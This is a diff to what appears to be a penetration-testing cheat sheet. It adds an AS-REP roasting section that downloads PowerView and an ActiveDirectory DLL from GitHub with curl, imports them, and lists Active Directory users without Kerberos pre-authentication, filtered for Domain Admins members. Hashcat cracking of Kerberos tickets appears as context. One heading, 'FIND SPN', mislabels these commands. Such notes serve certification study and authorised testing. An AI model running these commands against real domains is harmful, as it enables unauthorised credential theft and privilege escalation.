@@ -354,7 +354,29 @@ hashcat -m 13100 -a 0 ticket.john wordlist.txt
 hashcat -m 13100 -a 0 ticket.john wordlist.txt --show
 hashcat -m 13100 -a 0 ticket.john wordlist.txt --potfile-disable
 ```
-
+## KERBEROASTING-ASREP
+##### KERBEROASTINGASREP - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
+import-module .\Microsoft.ActiveDirectory.Management.dll
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
+import-module .\PowerView.ps1
+```
+##### KERBEROASTING-ASREP - FIND SPN
+PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
+```
+Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
+Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName, ServicePrincipalName
+```
+```
+Get-DomainUser -PreauthNotRequired -Verbose
+Get-DomainUser -PreauthNotRequired 
+Get-DomainUser -PreauthNotRequired | select samaccountname
+Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'}
+Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'} | select samaccountname
+```
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
